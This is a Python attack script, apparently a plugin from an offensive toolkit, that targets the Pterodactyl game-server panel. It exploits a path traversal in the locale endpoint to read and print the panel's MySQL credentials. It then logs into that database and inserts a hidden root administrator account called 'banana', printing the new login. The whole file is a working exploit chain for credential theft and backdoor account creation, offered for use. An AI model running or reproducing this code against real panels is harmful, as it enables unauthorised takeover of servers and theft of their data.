import mysql.connector
import bcrypt
import warnings
import urllib3
import requests
import uuid
import string
from requests.exceptions import RequestException
from plugins.common import *

def exploit(target_url):
    warnings.filterwarnings("ignore", category=UserWarning)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    target_url = target_url.strip().rstrip('/') + '/'
    endpoint = f"{target_url}locales/locale.json?locale=../../../pterodactyl&namespace=config/database"

    print(f"\n{gray}[{red}#{gray}] {white}Checking {red}{target_url}{white} for vuln...\n")

    try:
        response = requests.get(endpoint, allow_redirects=True, timeout=5, verify=False)

        if response.status_code == 200 and "pterodactyl" in response.text.lower():
            try:
                raw_data = response.json()
                data = raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"]
                print(f"{gray}[{red}#{gray}] {green}Host is vulnerable!")
                print(f"{gray}• {red}Host:     {white}{data['host']}")
                print(f"{gray}• {red}Port:     {white}{data['port']}")
                print(f"{gray}• {red}Database: {white}{data['database']}")
                print(f"{gray}• {red}Username: {white}{data['username']}")
                print(f"{gray}• {red}Password: {white}{data['password']}\n")

                return data
            except (KeyError, TypeError):
                print(f"{gray}[{red}#{gray}] {white}Vulnerable, but database info is unavailable\n")
                return None
        else:
            print(f"{gray}[{red}#{gray}] {white}Not vulnerable or data not found\n")
            return None

    except RequestException as e:
        if "NameResolutionError" in str(e):
            print(f"{gray}[{red}#{gray}] {white}Invalid target or unable to resolve domain\n")
        else:
            print(f"{gray}[{red}#{gray}] {white}Request error: {e}\n")
        return None

def ptero(target_url):
    if not (target_url.startswith('http://') or target_url.startswith('https://')): target_url = 'https://' + target_url
    data = exploit(target_url)
    if not data:
        return

    print(f"{gray}[{red}#{gray}] {white}Attempting to create admin account...\n")

    email = "banana@us.gov"
    username = "banana"
    first_name = "Banana"
    last_name = "Republic"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    uuid_str = str(uuid.uuid4())
    host_clean = str(target_url).replace('https://', '').replace('http://', '').replace('/', '')

    try:
        conn = mysql.connector.connect(
            host=host_clean,
            port=int(data['port']),
            user=data['username'],
            password=data['password'],
            database=data['database']
        )
    except mysql.connector.Error as err:
        print(f"{gray}[{red}#{gray}] {red}Connection error:{white} {err}\n")
        return

    cursor = conn.cursor()
    hashed_pw = bcrypt.hashpw(password.encode(), bcrypt.gensalt(10)).decode()

    sql = """
    INSERT INTO users (
        external_id, uuid, username, email, name_first, name_last, password,
        remember_token, language, root_admin, use_totp, totp_secret, totp_authenticated_at,
        gravatar, created_at, updated_at
    ) VALUES (
        NULL, %s, %s, %s, %s, %s, %s,
        %s, 'en', 1, 0, NULL, NULL,
        1, NOW(), NOW()
    )
    """

    try:
        remember_token = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
        cursor.execute(sql, (
            uuid_str,
            username,
            email,
            first_name,
            last_name,
            hashed_pw,
            remember_token
        ))
        conn.commit()

        print(f"{gray}[{red}#{gray}] {green}Admin Created\n")
        print(f"{gray}• {red}Panel:    {white}{target_url}")
        print(f"{gray}• {red}Username: {white}{username}")
        print(f"{gray}• {red}Email:    {white}{email}")
        print(f"{gray}• {red}Password: {white}{password}\n")

    except mysql.connector.Error as err:
        print(f"{gray}[{red}#{gray}] {red}Failed to add admin user:{white} {err}\n")
    finally:
        cursor.close()
        conn.close()
